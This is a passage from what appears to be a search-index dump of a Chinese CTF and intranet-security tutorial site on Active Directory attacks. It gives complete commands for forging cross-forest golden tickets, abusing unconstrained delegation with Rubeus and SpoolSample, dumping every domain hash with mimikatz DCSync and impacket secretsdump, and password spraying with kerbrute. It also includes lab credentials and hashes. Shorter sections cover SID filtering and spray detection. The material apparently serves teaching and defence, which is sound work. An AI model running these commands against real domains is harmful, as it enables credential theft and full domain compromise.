shanghai.xie.com/administrator@ad.xie.com\n#\u5bfc\u51fa\u6797\u6839\u57df\u5185 krbtgt \u7684\u54c8\u5e0c\npython3 secretsdump.py -no-pass -k shanghai.xie.com/administrator@ad.xie.com-just-dc-user \"xie\\krbtgt\"\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u5229\u7528\u5b8c\u6210\u540e\u5373\u53ef\u8fdc\u7a0b\u8fde\u63a5\u6797\u6839\u57df\u7684\u57df\u63a7\u5236\u5668\uff1a</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5bfc\u51fa\u6797\u6839\u57df krbtgt \u7528\u6237\u7684\u54c8\u5e0c\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#4-mimikatz","title":"(4) mimikatz \u653b\u51fb","text":"<p>\u83b7\u5f97 inter-realm key \u540e\uff0c\u53ef\u4ee5\u5229\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\u3002</p> <pre><code>#\u751f\u6210\u9ad8\u6743\u9650\u7684\u9ec4\u91d1\u7968\u636e\nkerberos::golden /user:administrator /domain:shanghai.xie.com /sids:S-1-5-21-1313979556-3624129433-4055459191-519 /sid:S-1-5-21-909331469-3570597106-3737937367 /krbtgt:0f81015ca4691b714e9db485568e5e6b /service:krbtgt /target:xie.com /ptt\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5c06\u9ec4\u91d1\u7968\u636e\u5bfc\u5165\u5185\u5b58\u540e\uff0c\u5373\u53ef\u8fdc\u7a0b\u8bbf\u95ee\u6797\u6839\u57df\u7684\u57df\u63a7\u5236\u5668\u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#4","title":"4.\u5229\u7528\u975e\u7ea6\u675f\u6027\u59d4\u6d3e","text":"<p>\u57df\u63a7\u5236\u5668\u9ed8\u8ba4\u914d\u7f6e\u4e86\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u9009\u9879\u3002\u56e0\u6b64\u5f53\u6211\u4eec\u63a7\u5236\u4e86\u5b50\u57df\u7684\u57df\u63a7\u5236\u5668\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5b50\u57df\u7684\u57df\u63a7\u5236\u5668\u6765\u8fdb\u884c\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u7684\u653b\u51fb\u3002</p> <p>\u2013 \u5b50\u57df\u57df\u63a7\uff1aSH-DC01 </p> <p>\u2013 \u8981\u653b\u51fb\u7684\u6839\u57df\u57df\u63a7\uff1aDC02</p> <p>\u9996\u5148\u5728\u5b50\u57df\u57df\u63a7\u5236\u5668\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u76d1\u542c\u6765\u81ea DC02 \u7684\u7968\u636e</p> <pre><code>Rubeus.exe monitor /interval:1 /filteruser:DC02$ /nowrap\n</code></pre> <p>\u7136\u540e\u5728\u5b50\u57df\u57df\u63a7\u5236\u5668\u4e0a\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u4f7f\u7528\u6253\u5370\u673a\u670d\u52a1\u6f0f\u6d1e\u653b\u51fb\u6797\u6839\u57df\u57df\u63a7DC02\uff0c\u4f7f\u5176\u5f3a\u5236\u56de\u8fde\u8ba4\u8bc1\u6211\u4eec\u7684\u5b50\u57df\u57df\u63a7\u5236\u5668 sh-DC01\u3002</p> <pre><code>SpoolSample.exe DC02 sh-DC01\n</code></pre> <p>\u653b\u51fb\u5b8c\u6210\u540e\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u7684 Rubeus \u5df2\u7ecf\u6536\u5230\u6765\u81ea DC02 \u7684 base64 \u7684 TGT\u8ba4\u8d2d\u6743\u8bc1\u4e86\u3002</p> <p></p> <p>\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 Rubeus \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u5165\u8fd9\u4e2a base64 \u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 mimikatz \u5bfc\u51fa\u6797\u6839\u57df\u7684\u6240\u6709\u7528\u6237 hash \u4e86\u3002</p> <pre><code>Rubeus.exe ptt /ticket:base64 \u683c\u5f0f\u7684\u7968\u636e\nmimikatz.exe \"lsadump::dcsync /domain:xie.com /user:xie\\krbtgt /csv\" \"exit\"\n</code></pre> <p></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_7","title":"\u83b7\u5f97\u6797\u6839\u57df\u7684\u540e\u64cd\u4f5c","text":"<p>\u83b7\u5f97\u6797\u6839\u57df xie.com \u7684\u57df\u63a7\u5236\u5668\u6743\u9650\u540e\uff0c\u5373\u53ef\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u51fa\u5168\u6797\u4e2d\u4efb\u610f\u57df\u7684\u6307\u5b9a\u7528\u6237\u7684\u54c8\u5e0c\uff1a</p> <pre><code>#\u5bfc\u51fa\u57df xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:xie.com /user:xie\\krbtgt /csv\n#\u5bfc\u51fa\u57df beijing.xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:beijing.xie.com /user:beijing\\krbtgt /csv\n#\u5bfc\u51fa\u57df shanghai.xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:shanghai.xie.com /user:shanghai\\krbtgt /csv\n</code></pre> <p>\u5728\u6797\u6839\u57df\u7684\u57df\u63a7\u4e0a\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5bfc\u51fa\u5168\u6797\u4e2d\u4efb\u610f\u57df\u7684\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\u3002</p> <pre><code>#\u5bfc\u51fa\u57df xie.com \u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:xie.com /all /csv\n#\u5bfc\u51fa\u57df beijing.xie.com \u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:beijing.xie.com /all /csv\n#\u5bfc\u51fa\u57df shanghai.xie.com \u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\nlsadump::dcsync /domain:shanghai.xie.com /all /csv\n</code></pre> <p>\u6216\u8005\u53ef\u4ee5\u901a\u8fc7 CobaltStrike \u5185\u7f6e\u7684 mimikatz \u6a21\u5757\u5f97\u5230\u6797\u6839\u57df xie.com \u7684\u57df\u7ba1\u7406\u5458 administrator \u7684\u54c8\u5e0c\u4e3a\uff1a33e17aa21ccc6ab0e6ff30eecb918dfb\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <pre><code>  ![\u622a\u56fe](c9e2b14b05d78a53f6be4bce0fa58651.png)\n</code></pre> <p>\u901a\u8fc7\u89e3\u5bc6\u8be5\u54c8\u5e0c\u5f97\u5230\u660e\u6587\u5bc6\u7801\u4e3a\uff1aP@ssword1234\u3002\u7136\u540e\u901a\u8fc7 impacket \u4e0b\u7684secretsdump.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u901a\u8fc7 DCSync \u8fdc\u7a0b\u5bfc\u51fa\u5168\u6797\u5185\u6307\u5b9a\u7528\u6237\u7684\u54c8\u5e0c\uff0c\u8981\u5bfc\u51fa\u54ea\u4e2a\u57df\u7684\u54c8\u5e0c\uff0c\u5c31\u8fde\u63a5\u6307\u5b9a\u57df\u7684\u57df\u63a7\uff0c\u5982\u679c\u662f\u5bfc\u51fa\u6307\u5b9a\u7528\u6237\uff0c\u9700\u8981\u52a0\u4e0a\u524d\u7f00</p> <pre><code>#\u5bfc\u51fa\u57df xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py xie/administrator:P@ssword1234@10.211.55.4 -just-dc-user \"xie\\krbtgt\" \n#\u5bfc\u51fa\u57df shanghai.xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py xie/administrator:P@ssword1234@10.211.55.13 -just-dc-user \"shanghai\\krbtgt\"\n#\u5bfc\u51fa\u57df beijing.xie.com \u5185 krbtgt \u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py xie/administrator:P@ssword1234@10.211.55.14 -just-dc-user \"beijing\\krbtgt\"\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u901a\u8fc7 impacket \u5bfc\u51fa\u4e0d\u540c\u57df\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\u3002</p> <pre><code>#\u5bfc\u51fa\u57df xie.com \u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py xie/administrator:P@ssword1234@10.211.55.4 -just-dc\n#\u5bfc\u51fa\u57df shanghai.xie.com \u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py xie/administrator:P@ssword1234@10.211.55.13 -just-dc\n#\u5bfc\u51fa\u57df beijing.xie.com \u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\npython3 secretsdump.py xie/administrator:P@ssword1234@10.211.55.14 -just-dc\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#_8","title":"\u57df\u6797\u6a2a\u5411\u653b\u51fb\u9632\u5fa1","text":""},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#sid","title":"SID \u8fc7\u6ee4","text":"<p>\u5728\u540c\u4e00\u4e2a\u57df\u68ee\u6797\u5185\u90e8\uff0cSID History \u5c5e\u6027\u6ca1\u6709\u88ab SID \u8fc7\u6ee4\u673a\u5236\u4fdd\u62a4\uff0c\u5bfc\u81f4\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SID History \u5c5e\u6027\u8fdb\u884c\u6743\u9650\u63d0\u5347\u3002\u800c\u5728\u8de8\u68ee\u6797\u7684\u57df\u4fe1\u4efb\u5173\u7cfb\u4e2d\uff0cSIDHistory \u5c5e\u6027\u88ab SID \u8fc7\u6ee4\u673a\u5236\u6240\u4fdd\u62a4\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u65e0\u6cd5\u901a\u8fc7 SID History \u5c5e\u6027\u8fdb\u884c\u8de8\u68ee\u6797\u6a2a\u5411\u653b\u51fb\u3002\u8fd9\u4e5f\u662f\u5fae\u8f6f\u5ba3\u4f20\u7684\u57df\u68ee\u6797\u662f\u6d3b\u52a8\u76ee\u5f55\u7684\u5b89\u5168\u8fb9\u754c\u7684\u539f\u56e0\u6240\u5728\u3002\u56e0\u6b64\uff0c\u9488\u5bf9\u57df\u6797\u6a2a\u5411\u653b\u51fb\u9632\u5fa1\u7684\u6700\u4f73\u624b\u6bb5\u5c31\u662f\u914d\u7f6e\u57df\u68ee\u6797\u5185\u90e8\u7684 SID \u8fc7\u6ee4\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#sid_1","title":"\u5982\u4f55\u5f00\u542f SID \u8fc7\u6ee4","text":"<p>\u4f7f\u7528\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 netdom \u5de5\u5177\u6765\u5f00\u542f SID \u8fc7\u6ee4\u3002</p> <p>\u4f7f\u7528 netdom \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5f00\u542f\u57df shanghai.xie.com \u5230\u57df xie.com \u7684 SID \u8fc7\u6ee4\u3002</p> <pre><code>netdom trust /d:shanghai.xie.com xie.com /quarantine:yes\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article10/index.html#sid-history","title":"\u7981\u7528 SID History","text":"<p>\u7981\u7528\u4e4b\u524d\u4e00\u5b9a\u8981\u786e\u4fdd\u5f53\u524d\u57df\u5185\u6b63\u5e38\u7684\u8d44\u6e90\u8bbf\u95ee\u4e0d\u6d89\u53ca\u5230 SID History\u3002\u7981\u7528 SID History \u53ef\u4ee5\u4f7f\u7528\u5fae\u8f6f\u63d0\u4f9b\u7684 netdom \u5de5\u5177\uff0c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\u7981\u7528\uff1a</p> <pre><code>#\u7981\u7528 shanghai.xie.com \u5230 xie.com \u7684 SID History\nnetdom trust /d:shanghai.xie.com xie.com /EnableSIDHistory:no\n#\u7981\u7528 beijing.xie.com \u5230 xie.com \u7684 SID History\nnetdom trust /d:beijing.xie.com xie.com /EnableSIDHistory:no\n</code></pre> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article2/index.html","title":"\u57df\u5185\u5bc6\u7801\u55b7\u6d12","text":"<p>\u57df\u5185\u5bc6\u7801\u55b7\u6d12\u4e00\u822c\u548c\u57df\u5185\u7528\u6237\u540d\u679a\u4e3e\u4e00\u8d77\u4f7f\u7528\uff0c\u53ef\u4ee5\u5728\u65e0\u57df\u5185\u6709\u6548\u51ed\u636e\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7\u679a\u4e3e\u51fa\u57df\u5185\u5b58\u5728\u7684\u7528\u6237\u540d\uff0c\u8fdb\u800c\u5bf9\u57df\u5185\u5b58\u5728\u7684\u7528\u6237\u540d\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\uff0c\u4ee5\u6b64\u6765\u83b7\u5f97\u57df\u5185\u6709\u6548\u51ed\u636e\u3002</p> <p>\u5728 Kerberos \u534f\u8bae\u8ba4\u8bc1\u7684 AS-REQ \u9636\u6bb5\uff0c\u8bf7\u6c42\u5305 cname \u5bf9\u5e94\u7684\u503c\u662f\u7528\u6237\u540d\u3002\u5f53\u7528\u6237\u540d\u5b58\u5728\uff0c\u5bc6\u7801\u6b63\u786e\u548c\u5bc6\u7801\u9519\u8bef\u65f6\uff0cAS-REP \u7684\u8fd4\u56de\u5305\u4e0d\u4e00\u6837\u3002\u6240\u4ee5\u53ef\u4ee5\u5229\u7528\u8fd9\u70b9\uff0c\u5bf9\u76ee\u6807\u57df\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\uff08Password Spraying\uff09\u653b\u51fb\u3002\u8fd9\u79cd\u9488\u5bf9\u6240\u6709\u7528\u6237\u7684\u81ea\u52a8\u5bc6\u7801\u731c\u6d4b\u901a\u5e38\u662f\u4e3a\u4e86\u907f\u514d\u5e10\u6237\u88ab\u9501\u5b9a\uff0c\u56e0\u4e3a\u5982\u679c\u76ee\u6807\u57df\u8bbe\u7f6e\u4e86\u7528\u6237\u9501\u5b9a\u7b56\u7565\u7684\u8bdd\uff0c\u9488\u5bf9\u540c\u4e00\u4e2a\u7528\u6237\u7684\u8fde\u7eed\u5bc6\u7801\u731c\u6d4b\u4f1a\u5bfc\u81f4\u5e10\u6237\u88ab\u9501\u5b9a\u3002\u6240\u4ee5\u53ea\u6709\u5bf9\u6240\u6709\u7528\u6237\u540c\u65f6\u6267\u884c\u7279\u5b9a\u7684\u5bc6\u7801\u767b\u5f55\u5c1d\u8bd5\uff0c\u624d\u80fd\u589e\u52a0\u7834\u89e3\u7684\u6982\u7387\uff0c\u6d88\u9664\u5e10\u6237\u88ab\u9501\u5b9a\u7684\u6982\u7387\u3002\u666e\u901a\u7684\u7206\u7834\u5c31\u662f\u7528\u6237\u540d\u56fa\u5b9a\uff0c\u7206\u7834\u5bc6\u7801\uff0c\u4f46\u662f\u5bc6\u7801\u55b7\u6d12\uff0c\u662f\u7528\u56fa\u5b9a\u7684\u5bc6\u7801\u53bb\u8dd1\u7528\u6237\u540d\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article2/index.html#_2","title":"\u57df\u5185\u5bc6\u7801\u55b7\u6d12\u5de5\u5177","text":"<p>\u56e0\u6b64\uff0c\u5f53\u653b\u51fb\u8005\u4e0d\u5728\u57df\u5185\u65f6\uff0c\u53ef\u4ee5\u5148\u901a\u8fc7\u57df\u5185\u7528\u6237\u679a\u4e3e\u6765\u679a\u4e3e\u51fa\u57df\u5185\u5b58\u5728\u7684\u7528\u6237\u3002\u7136\u540e\u518d\u8fdb\u884c\u57df\u5185\u5bc6\u7801\u55b7\u6d12\uff0c\u6765\u5c1d\u8bd5\u55b7\u6d12\u51fa\u6709\u6548\u7684\u57df\u7528\u6237\u5bc6\u7801\u3002\u9488\u5bf9\u57df\u5185\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u5f00\u6e90\u7684\u9879\u76ee\uff0c\u4ee5\u4e0b\u6f14\u793a\u4f7f\u7528\u5982\u4e0b\u51e0\u6b3e\u5de5\u5177\u8fdb\u884c\u57df\u5185\u5bc6\u7801\u55b7\u6d12</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article2/index.html#1-kerbrute","title":"1. Kerbrute","text":"<p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/ropnop/kerbrute</p> <p>\u4e00\u6b3e\u4f7f\u7528 go \u8bed\u8a00\u5199\u7684\u57df\u7528\u6237\u679a\u4e3e\u548c\u5bc6\u7801\u55b7\u6d12\u5de5\u5177\u3002\u8be5\u5de5\u5177\u5bc6\u7801\u55b7\u6d12\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>./kerbrute_darwin_amd64 passwordspray --dc 10.211.55.4 -d xie.com user.txt P@ssw0rd\n</code></pre> <p>\u53c2\u6570\u542b\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>passwordspray\uff1a\u5bc6\u7801\u55b7\u6d12\u6a21\u5f0f</li> <li>--dc\uff1a\u6307\u5b9a\u57df\u63a7 ip</li> <li>-d\uff1a\u6307\u5b9a\u57df\u540d</li> <li>user.txt\uff1a\u7528\u6237\u540d\u5b57\u5178\u6587\u4ef6\uff0c\u91cc\u9762\u7684\u5b57\u5178\u53ef\u4e0d\u52a0\u57df\u540d\u540e\u7f00</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd0\u884c\u8be5\u5de5\u5177\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\uff0c\u53ef\u4ee5\u770b\u5230\u55b7\u6d12\u51fa hack \u548c test \u7528\u6237\u7684\u5bc6\u7801\u5747\u4e3a P@ss1234\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67e5\u8be2\u5f97\u77e5\u76ee\u6807\u57df\u4e0d\u5b58\u5728\u5bc6\u7801\u9501\u5b9a\u7b56\u7565\u7684\u8bdd\uff0c</p> <p></p> <p>\u5219\u6211\u4eec\u53ef\u4ee5\u9488\u5bf9\u5355\u4e2a\u7528\u6237\u8fdb\u884c\u5bc6\u7801\u5b57\u5178\u7206\u7834\uff0c\u5982\u4e0b\u547d\u4ee4\u9488\u5bf9 administrator\u57df\u7ba1\u7406\u5458\u8fdb\u884c\u5bc6\u7801\u5b57\u5178\u7206\u7834\u3002</p> <pre><code>./kerbrute_darwin_amd64 bruteuser --dc 10.211.55.4 -d xie.com pass.txt administrator\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u9488\u5bf9 administrator \u57df\u7ba1\u7406\u5458\u8fdb\u884c\u5bc6\u7801\u5b57\u5178\u7206\u7834\uff0c\u7206\u7834\u51fa\u57df\u7ba1\u7406\u5458 administrator \u7684\u5bc6\u7801\u4e3a P@ssword1234\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article2/index.html#2-pykerbrute","title":"2. pyKerbrute","text":"<p>\u9879\u76ee\u5730\u5740\uff1ahttps://github.com/3gstudent/pyKerbrute</p> <p>\u4e00\u6b3e\u4f7f\u7528 python \u5199\u7684\u57df\u7528\u6237\u679a\u4e3e\u548c\u5bc6\u7801\u55b7\u6d12\u811a\u672c\u3002\u5176\u53ef\u4ee5\u901a\u8fc7 tcp \u548c udp\u4e24\u79cd\u6a21\u5f0f\u8fdb\u884c\u5de5\u4f5c\u3002user.txt \u7528\u6237\u540d\u6587\u4ef6\u683c\u5f0f\u4e0d\u9700\u8981\u52a0\u540e\u7f00\u683c\u5f0f\u3002\u5bc6\u7801\u55b7\u6d12\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u4f7f\u7528\u660e\u6587\u5bc6\u7801\u6216\u8005\u5bc6\u7801\u7684 hash\u3002\u5bc6\u7801\u55b7\u6d12\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>#\u9488\u5bf9\u660e\u6587\u8fdb\u884c\u55b7\u6d12\uff0ctcp \u6a21\u5f0f\u548c udp \u6a21\u5f0f\npython2 ADPwdSpray.py 10.211.55.4 xie.com user.txt clearpassword P@ssw0rd tcp\npython2 ADPwdSpray.py 10.211.55.4 xie.com user.txt clearpassword P@ssw0rd udp\n\n#\u9488\u5bf9\u54c8\u5e0c\u8fdb\u884c\u55b7\u6d12\uff0ctcp \u6a21\u5f0f\u548c udp \u6a21\u5f0f\npython2 ADPwdSpray.py 10.211.55.4 xie.com user.txt ntlmhash e19ccf75ee54e06b06a5907af13cef42 tcp\npython2 ADPwdSpray.py 10.211.55.4 xie.com user.txt ntlmhash e19ccf75ee54e06b06a5907af13cef42 udp\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u5229\u7528 pyKerbrute \u5de5\u5177\u4ee5 TCP/UDP \u4e24\u79cd\u6a21\u5f0f\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\uff0c\u53ef\u4ee5\u770b\u5230\u55b7\u6d12\u51fa hack \u548c test \u7528\u6237\u7684\u5bc6\u7801\u5747\u4e3a P@ss1234\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article2/index.html#_3","title":"\u57df\u5185\u5bc6\u7801\u55b7\u6d12\u6293\u5305\u5206\u6790","text":"<p>\u6211\u4eec\u9488\u5bf9 user.txt \u5b57\u5178\u4e2d\u7684\u5982\u4e0b\u7528\u6237\u540d\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\uff0c\u7136\u540e\u4f7f\u7528WireShark \u8fdb\u884c\u6293\u5305\u5206\u6790\u3002</p> <ul> <li>admin \u662f\u4e0d\u5b58\u5728\u7684\u7528\u6237</li> <li>test \u7528\u6237\u5bc6\u7801\u4e0d\u4e3a P@ss1234</li> <li>hack \u7528\u6237\u7684\u5bc6\u7801\u4e3a P@ss1234</li> </ul> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u7136\u540e\u5229\u7528 pyKerbrute \u5de5\u5177\u8fdb\u884c\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\uff0c\u53ef\u4ee5\u770b\u5230\u55b7\u6d12\u51fahack \u7528\u6237\u7684\u5bc6\u7801\u4e3a P@ss1234\u3002</p> <p></p> <p>\u5728\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\u7684\u540c\u65f6\uff0c\u4f7f\u7528 Wireshark \u6293\u5305\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u9488\u5bf9\u8fd9\u516d\u4e2a\u5305\u8fdb\u884c\u5206\u6790\u4e00\u4e0b\uff1a</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e00\u4e2a AS-REQ \u8bf7\u6c42\u5305\uff0c\u5176\u662f\u9488\u5bf9 admin \u7528\u6237\u8fdb\u884c\u9884\u8ba4\u8bc1\u7684\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e8c\u4e2a AS-REP \u56de\u590d\u5305\uff0c\u7531\u4e8e admin \u7528\u6237\u4e0d\u5b58\u5728\uff0c\u6240\u4ee5 AS- REP \u5305\u8fd4\u56de\u5982\u4e0b\u9519\u8bef\uff1a<code>KRB Error\uff1aKRB5KDC_ERR_C_PRINCIPAL_UNKNOWN</code></p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e09\u4e2a AS-REQ \u8bf7\u6c42\u5305\uff0c\u5176\u662f\u9488\u5bf9 test \u7528\u6237\u8fdb\u884c\u9884\u8ba4\u8bc1\u7684\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u56db\u4e2a AS-REP \u56de\u590d\u5305\uff0c\u7531\u4e8e test \u7528\u6237\u7684\u5bc6\u7801\u9519\u8bef\uff0c\u6240\u4ee5AS-REP \u5305\u8fd4\u56de\u5982\u4e0b\u9884\u8ba4\u8bc1\u9519\u8bef \uff1a<code>KRB Error\uff1aKRB5KDC_ERR_PREAUTH_FAILED</code></p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e94\u4e2a AS-REQ \u8bf7\u6c42\u5305\uff0c\u5176\u662f\u9488\u5bf9 hack \u7528\u6237\u8fdb\u884c\u9884\u8ba4\u8bc1\u7684\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u516d\u4e2a AS-REP \u56de\u590d\u5305\uff0c\u7531\u4e8e\u5bc6\u7801\u6b63\u786e\uff0c\u6240\u4ee5 AS-REP \u5305\u8fd4\u56de\u6b63\u5e38\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article2/index.html#_4","title":"\u57df\u5185\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\u9632\u5fa1","text":"<p>\u7531\u4e8e\u57df\u5185\u5bc6\u7801\u55b7\u6d12\u662f\u901a\u8fc7\u53d1\u9001\u5927\u91cf\u7684 AS-REQ \u8bf7\u6c42\u5305\uff0c\u6839\u636e\u8fd4\u56de\u5305\u7684\u5185\u5bb9\u5224\u65ad\u5bc6\u7801\u662f\u5426\u6b63\u786e\u3002\u56e0\u6b64\u53ef\u901a\u8fc7\u4ee5\u4e0b\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff1a</p> <ul> <li>\u6d41\u91cf\u5c42\u9762\u7684\u8bdd\uff0c\u53ef\u901a\u8fc7\u68c0\u6d4b\u540c\u4e00 IP \u5728\u77ed\u65f6\u95f4\u5185\u662f\u5426\u53d1\u9001\u4e86\u5927\u91cf\u7684AS-REQ \u8bf7\u6c42\u5305\u6765\u5224\u65ad\u3002\u5982\u679c\u540c\u4e00 IP \u5728\u77ed\u65f6\u95f4\u5185\u53d1\u9001\u7684\u5927\u91cf\u7684 AS-REQ\u8bf7\u6c42\u5305(\u5982 1 \u5206\u949f&gt;30 AS-REQ \u5305)\uff0c\u5219\u53ef\u5224\u65ad\u4e3a\u5f02\u5e38\u3002</li> <li>\u800c\u65e5\u5fd7\u5c42\u9762\u7684\u8bdd\uff0c\u5f53\u53e3\u4ee4\u7206\u7834\u6210\u529f\u65f6\uff0c\u4f1a\u4ea7\u751f\u5982\u56fe\u6240\u793a\u4e8b\u4ef6 ID \u4e3a<code>4768</code> \u4e14\u7ed3\u679c\u4ee3\u7801\u4e3a 0x0 \u7684\u5ba1\u6838\u6210\u529f\u7684 Kerberos \u8eab\u4efd\u9a8c\u8bc1\u670d\u52a1\u4e8b\u4ef6\u65e5\u5fd7\u3002\u800c\u53e3\u4ee4\u7206\u7834\u5931\u8d25\u65f6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5e76\u4e0d\u4f1a\u8bb0\u5f55\u4efb\u4f55\u65e5\u5fd7\u3002\u56e0\u6b64\u65e5\u5fd7\u5c42\u9762\u4e0d\u592a\u597d\u68c0\u6d4b</li> </ul> <p></p> <p></p> <p>\u800c\u9488\u5bf9\u57df\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\u8fdb\u884c\u9632\u5fa1\u7684\u8bdd\uff0c\u53ef\u4ee5\u8981\u6c42\u5458\u5de5\u8bbe\u7f6e\u5f3a\u53e3\u4ee4\u57df\u5bc6\u7801\uff0c\u8fd9\u5bf9\u4e8e\u57df\u5bc6\u7801\u55b7\u6d12\u653b\u51fb\u53ef\u4ee5\u8d77\u4e00\u4e2a\u5f88\u597d\u7684\u9632\u5fa1\u4f5c\u7528\u3002</p> <p>\u6ce8\uff1a\u9ed8\u8ba4\u60c5\u51b5\u4e0b Windows \u7cfb\u7edf\u7684\u65e5\u5fd7\u5e76\u4e0d\u4f1a\u8bb0\u5f55\u5b58\u5728\u7684\u7528\u6237\u540d\u800c\u5bc6\u7801\u9519\u8bef\u53d1\u8d77\u7684 AS-REQ \u8bf7\u6c42\u5305\u7684\u65e5\u5fd7\u3002\u5982\u679c\u60f3\u5f00\u542f\u6b64\u8bb0\u5f55\uff0c\u9700\u8981\u53bb\u7ec4\u7b56\u7565\u4e2d\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\u548c\u9ad8\u7ea7\u5ba1\u6838\u7b56\u7565\u3002\u5e76\u4e14\u65e5\u5fd7\u7684\u8bb0\u5f55\u8fd8\u548c\u901a\u4fe1\u7684 KDC 